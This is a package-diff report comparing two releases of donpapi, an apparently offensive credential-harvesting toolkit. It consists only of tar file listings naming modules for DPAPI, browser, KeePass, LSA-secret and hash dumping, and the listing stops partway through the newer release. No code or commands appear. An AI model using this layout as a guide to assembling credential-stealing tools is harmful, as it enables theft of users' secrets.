# Comparing `tmp/donpapi-1.0.1.tar.gz` & `tmp/donpapi-1.1.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "donpapi-1.0.1.tar", max compression
+gzip compressed data, was "donpapi-1.1.0.tar", max compression
```

## Comparing `donpapi-1.0.1.tar` & `donpapi-1.1.0.tar`

### file list

```diff
@@ -1,180 +1,181 @@
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.651395 donpapi-1.0.1/donpapi/__init__.py
--rw-r--r--   0        0        0      283 2023-07-06 08:25:26.651395 donpapi-1.0.1/donpapi/config/donpapi_config.json
--rw-r--r--   0        0        0   100868 2023-07-06 08:25:26.651395 donpapi-1.0.1/donpapi/database.py
--rw-r--r--   0        0        0    14936 2023-07-06 08:25:26.651395 donpapi-1.0.1/donpapi/entry.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.651395 donpapi-1.0.1/donpapi/lazagne/__init__.py
--rw-r--r--   0        0        0        2 2023-07-06 08:25:26.651395 donpapi-1.0.1/donpapi/lazagne/config/DPAPI/__init__.py
--rw-r--r--   0        0        0     5275 2023-07-06 08:25:26.651395 donpapi-1.0.1/donpapi/lazagne/config/DPAPI/blob.py
--rw-r--r--   0        0        0     3706 2023-07-06 08:25:26.651395 donpapi-1.0.1/donpapi/lazagne/config/DPAPI/credfile.py
--rw-r--r--   0        0        0     4260 2023-07-06 08:25:26.651395 donpapi-1.0.1/donpapi/lazagne/config/DPAPI/credhist.py
--rw-r--r--   0        0        0    15313 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/DPAPI/crypto.py
--rw-r--r--   0        0        0     4466 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/DPAPI/eater.py
--rw-r--r--   0        0        0    18015 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/DPAPI/masterkey.py
--rw-r--r--   0        0        0      957 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/DPAPI/system.py
--rw-r--r--   0        0        0    17204 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/DPAPI/vault.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/__init__.py
--rw-r--r--   0        0        0     6449 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/change_privileges.py
--rw-r--r--   0        0        0     2044 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/constant.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/crypto/__init__.py
--rw-r--r--   0        0        0    32239 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/crypto/pyDes.py
--rw-r--r--   0        0        0     2087 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/crypto/pyaes/__init__.py
--rw-r--r--   0        0        0    60310 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/crypto/pyaes/aes.py
--rw-r--r--   0        0        0     8123 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/crypto/pyaes/blockfeeder.py
--rw-r--r--   0        0        0     2060 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/crypto/pyaes/util.py
--rw-r--r--   0        0        0     1545 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/crypto/rc4.py
--rw-r--r--   0        0        0     9631 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/dico.py
--rw-r--r--   0        0        0     6595 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/dpapi_structure.py
--rw-r--r--   0        0        0     3630 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/execute_cmd.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/lib/__init__.py
--rw-r--r--   0        0        0     3463 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/Address.py
--rw-r--r--   0        0        0     1798 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/BaseProcess.py
--rw-r--r--   0        0        0    11069 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/LinProcess.py
--rw-r--r--   0        0        0      427 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/LinStructures.py
--rw-r--r--   0        0        0     3156 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/Locator.py
--rw-r--r--   0        0        0     8318 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/MemWorker.py
--rw-r--r--   0        0        0     5948 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/OSXProcess.py
--rw-r--r--   0        0        0      375 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/Process.py
--rw-r--r--   0        0        0     5069 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/SunProcess.py
--rw-r--r--   0        0        0    11967 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/WinProcess.py
--rw-r--r--   0        0        0     6155 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/WinStructures.py
--rw-r--r--   0        0        0     1081 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/__init__.py
--rw-r--r--   0        0        0      155 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/structures.py
--rw-r--r--   0        0        0     3336 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/utils.py
--rw-r--r--   0        0        0       92 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/version.py
--rw-r--r--   0        0        0     1227 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/wintools.py
--rw-r--r--   0        0        0     6004 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/manage_modules.py
--rw-r--r--   0        0        0     1407 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/module_info.py
--rw-r--r--   0        0        0    10076 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/run.py
--rw-r--r--   0        0        0     2939 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/users.py
--rw-r--r--   0        0        0    20971 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/winstructure.py
--rw-r--r--   0        0        0    14449 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/config/write_output.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/__init__.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/browsers/__init__.py
--rw-r--r--   0        0        0    10511 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/browsers/chromium_based.py
--rw-r--r--   0        0        0     6989 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/browsers/ie.py
--rw-r--r--   0        0        0    23438 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/browsers/mozilla.py
--rw-r--r--   0        0        0      880 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/browsers/ucbrowser.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/chats/__init__.py
--rw-r--r--   0        0        0      917 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/chats/pidgin.py
--rw-r--r--   0        0        0     1993 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/chats/psi.py
--rw-r--r--   0        0        0     5133 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/chats/skype.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/databases/__init__.py
--rw-r--r--   0        0        0     2792 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/databases/dbvis.py
--rw-r--r--   0        0        0     1019 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/databases/postgresql.py
--rw-r--r--   0        0        0     3919 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/databases/robomongo.py
--rw-r--r--   0        0        0     4374 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/databases/sqldeveloper.py
--rw-r--r--   0        0        0      945 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/databases/squirrel.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/games/__init__.py
--rw-r--r--   0        0        0     1828 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/games/galconfusion.py
--rw-r--r--   0        0        0     1336 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/games/kalypsomedia.py
--rw-r--r--   0        0        0     1378 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/games/roguestale.py
--rw-r--r--   0        0        0     1776 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/games/turba.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/git/__init__.py
--rw-r--r--   0        0        0     2263 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/git/gitforwindows.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/mails/__init__.py
--rw-r--r--   0        0        0     3662 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/mails/outlook.py
--rw-r--r--   0        0        0      280 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/mails/thunderbird.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/maven/__init__.py
--rw-r--r--   0        0        0     5712 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/maven/mavenrepositories.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/memory/__init__.py
--rw-r--r--   0        0        0     1171 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/memory/keepass.py
--rw-r--r--   0        0        0   361825 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/memory/keethief.py
--rw-r--r--   0        0        0     2159 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/memory/libkeepass/__init__.py
--rw-r--r--   0        0        0     9068 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/memory/libkeepass/common.py
--rw-r--r--   0        0        0     1638 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/memory/libkeepass/crypto.py
--rw-r--r--   0        0        0     4214 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/memory/libkeepass/hbio.py
--rw-r--r--   0        0        0    15332 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/memory/libkeepass/kdb4.py
--rw-r--r--   0        0        0    13773 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/memory/libkeepass/pureSalsa20.py
--rw-r--r--   0        0        0     6259 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/memory/memorydump.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/multimedia/__init__.py
--rw-r--r--   0        0        0     4144 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/multimedia/eyecon.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/php/__init__.py
--rw-r--r--   0        0        0     2199 2023-07-06 08:25:26.655396 donpapi-1.0.1/donpapi/lazagne/softwares/php/composer.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/svn/__init__.py
--rw-r--r--   0        0        0     2448 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/svn/tortoise.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/__init__.py
--rw-r--r--   0        0        0     2409 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/apachedirectorystudio.py
--rw-r--r--   0        0        0     1950 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/coreftp.py
--rw-r--r--   0        0        0     2107 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/cyberduck.py
--rw-r--r--   0        0        0    13660 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/d3des.py
--rw-r--r--   0        0        0     2049 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/filezilla.py
--rw-r--r--   0        0        0     1493 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/filezillaserver.py
--rw-r--r--   0        0        0     1640 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/ftpnavigator.py
--rw-r--r--   0        0        0     2454 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/iisapppool.py
--rw-r--r--   0        0        0     5312 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/iiscentralcertp.py
--rw-r--r--   0        0        0     5427 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/keepassconfig.py
--rw-r--r--   0        0        0     4016 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/opensshforwindows.py
--rw-r--r--   0        0        0     2109 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/openvpn.py
--rw-r--r--   0        0        0     1628 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/puttycm.py
--rw-r--r--   0        0        0     3610 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/rdpmanager.py
--rw-r--r--   0        0        0     3184 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/unattended.py
--rw-r--r--   0        0        0     6857 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/vnc.py
--rw-r--r--   0        0        0     4078 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/winscp.py
--rw-r--r--   0        0        0     1543 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/wsl.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/wifi/__init__.py
--rw-r--r--   0        0        0     4629 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/wifi/wifi.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/windows/__init__.py
--rw-r--r--   0        0        0     1614 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/windows/autologon.py
--rw-r--r--   0        0        0      699 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/windows/cachedump.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/windows/creddump7/__init__.py
--rw-r--r--   0        0        0     4434 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/windows/creddump7/addrspace.py
--rw-r--r--   0        0        0    10218 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/windows/creddump7/newobj.py
--rw-r--r--   0        0        0     4990 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/windows/creddump7/object.py
--rw-r--r--   0        0        0     2542 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/windows/creddump7/types.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/windows/creddump7/win32/__init__.py
--rw-r--r--   0        0        0     4411 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/windows/creddump7/win32/domcachedump.py
--rw-r--r--   0        0        0    10430 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/windows/creddump7/win32/hashdump.py
--rw-r--r--   0        0        0     5138 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/windows/creddump7/win32/lsasecrets.py
--rw-r--r--   0        0        0     2297 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/windows/creddump7/win32/rawreg.py
--rw-r--r--   0        0        0      899 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/windows/credfiles.py
--rw-r--r--   0        0        0     1455 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/windows/credman.py
--rw-r--r--   0        0        0      528 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/windows/hashdump.py
--rw-r--r--   0        0        0     1227 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/windows/lsa_secrets.py
--rw-r--r--   0        0        0     2717 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/windows/ppypykatz.py
--rw-r--r--   0        0        0     2942 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/windows/vault.py
--rw-r--r--   0        0        0      920 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/windows/vaultfiles.py
--rw-r--r--   0        0        0     3275 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lazagne/softwares/windows/windows.py
--rw-r--r--   0        0        0     4974 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lib/RecentFiles.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lib/__init__.py
--rw-r--r--   0        0        0    16870 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lib/adconnect.py
--rw-r--r--   0        0        0    42137 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lib/certificates.py
--rw-r--r--   0        0        0     4605 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lib/compliance_security.py
--rw-r--r--   0        0        0     2141 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lib/defines.py
--rw-r--r--   0        0        0    30179 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lib/dpapi.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lib/dpapi_pick/__init__.py
--rw-r--r--   0        0        0    11994 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lib/dpapi_pick/credhist.py
--rw-r--r--   0        0        0    14585 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lib/dpapi_pick/crypto.py
--rw-r--r--   0        0        0     4466 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lib/dpapi_pick/eater.py
--rw-r--r--   0        0        0     4466 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lib/eater.py
--rw-r--r--   0        0        0    10656 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lib/fileops.py
--rw-r--r--   0        0        0     3938 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lib/neo4jconnection.py
--rw-r--r--   0        0        0     3006 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lib/new_module.py
--rw-r--r--   0        0        0    19699 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lib/reg.py
--rw-r--r--   0        0        0   116877 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lib/secretsdump.py
--rw-r--r--   0        0        0     3542 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lib/toolbox.py
--rw-r--r--   0        0        0     3484 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/lib/wmi.py
--rw-r--r--   0        0        0   103749 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/myseatbelt.py
--rw-r--r--   0        0        0     5699 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/myusers.py
--rw-r--r--   0        0        0    52548 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/res/Logo_LOGIN.PNG
--rw-r--r--   0        0        0     3429 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/res/style.css
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/software/__init__.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/software/browser/__init__.py
--rw-r--r--   0        0        0    10104 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/software/browser/chrome_decrypt.py
--rw-r--r--   0        0        0     7015 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/software/browser/firefox_decrypt.py
--rw-r--r--   0        0        0    17891 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/software/browser/mozilla.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/software/manager/__init__.py
--rw-r--r--   0        0        0    23725 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/software/manager/keepass.py
--rw-r--r--   0        0        0     4486 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/software/manager/lastpass.py
--rw-r--r--   0        0        0     5902 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/software/manager/mRemoteNG-local.py
--rw-r--r--   0        0        0    12420 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/software/manager/mRemoteNG.py
--rw-r--r--   0        0        0        0 2023-07-06 08:25:26.659396 donpapi-1.0.1/donpapi/software/sysadmin/__init__.py
--rw-r--r--   0        0        0    13660 2023-07-06 08:25:26.663396 donpapi-1.0.1/donpapi/software/sysadmin/d3des.py
--rw-r--r--   0        0        0     6545 2023-07-06 08:25:26.663396 donpapi-1.0.1/donpapi/software/sysadmin/mobaxterm.py
--rw-r--r--   0        0        0     2186 2023-07-06 08:25:26.663396 donpapi-1.0.1/donpapi/software/sysadmin/putty.py
--rw-r--r--   0        0        0      210 2023-07-06 08:25:26.663396 donpapi-1.0.1/donpapi/software/sysadmin/teamviewer.py
--rw-r--r--   0        0        0     2653 2023-07-06 08:25:26.663396 donpapi-1.0.1/donpapi/software/sysadmin/vnc-local.py
--rw-r--r--   0        0        0     9808 2023-07-06 08:25:26.663396 donpapi-1.0.1/donpapi/software/sysadmin/vnc.py
--rw-r--r--   0        0        0     6545 2023-07-06 08:25:26.663396 donpapi-1.0.1/donpapi/software/sysadmin/winscp.py
--rw-r--r--   0        0        0     1015 2023-07-06 08:25:26.663396 donpapi-1.0.1/pyproject.toml
--rw-r--r--   0        0        0    11514 2023-07-06 08:25:26.663396 donpapi-1.0.1/readme.md
--rw-r--r--   0        0        0    12455 1970-01-01 00:00:00.000000 donpapi-1.0.1/PKG-INFO
+-rw-r--r--   0        0        0    35149 2023-07-12 08:43:58.633784 donpapi-1.1.0/LICENSE
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/__init__.py
+-rw-r--r--   0        0        0      283 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/config/donpapi_config.json
+-rw-r--r--   0        0        0   100868 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/database.py
+-rw-r--r--   0        0        0    15008 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/entry.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/__init__.py
+-rw-r--r--   0        0        0        2 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/DPAPI/__init__.py
+-rw-r--r--   0        0        0     5275 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/DPAPI/blob.py
+-rw-r--r--   0        0        0     3706 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/DPAPI/credfile.py
+-rw-r--r--   0        0        0     4260 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/DPAPI/credhist.py
+-rw-r--r--   0        0        0    15313 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/DPAPI/crypto.py
+-rw-r--r--   0        0        0     4466 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/DPAPI/eater.py
+-rw-r--r--   0        0        0    18015 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/DPAPI/masterkey.py
+-rw-r--r--   0        0        0      957 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/DPAPI/system.py
+-rw-r--r--   0        0        0    17204 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/DPAPI/vault.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/__init__.py
+-rw-r--r--   0        0        0     6449 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/change_privileges.py
+-rw-r--r--   0        0        0     2044 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/constant.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/crypto/__init__.py
+-rw-r--r--   0        0        0    32239 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/crypto/pyDes.py
+-rw-r--r--   0        0        0     2087 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/crypto/pyaes/__init__.py
+-rw-r--r--   0        0        0    60310 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/crypto/pyaes/aes.py
+-rw-r--r--   0        0        0     8123 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/crypto/pyaes/blockfeeder.py
+-rw-r--r--   0        0        0     2060 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/crypto/pyaes/util.py
+-rw-r--r--   0        0        0     1545 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/crypto/rc4.py
+-rw-r--r--   0        0        0     9631 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/dico.py
+-rw-r--r--   0        0        0     6595 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/dpapi_structure.py
+-rw-r--r--   0        0        0     3630 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/execute_cmd.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/lib/__init__.py
+-rw-r--r--   0        0        0     3463 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/Address.py
+-rw-r--r--   0        0        0     1798 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/BaseProcess.py
+-rw-r--r--   0        0        0    11069 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/LinProcess.py
+-rw-r--r--   0        0        0      427 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/LinStructures.py
+-rw-r--r--   0        0        0     3156 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/Locator.py
+-rw-r--r--   0        0        0     8318 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/MemWorker.py
+-rw-r--r--   0        0        0     5948 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/OSXProcess.py
+-rw-r--r--   0        0        0      375 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/Process.py
+-rw-r--r--   0        0        0     5069 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/SunProcess.py
+-rw-r--r--   0        0        0    11967 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/WinProcess.py
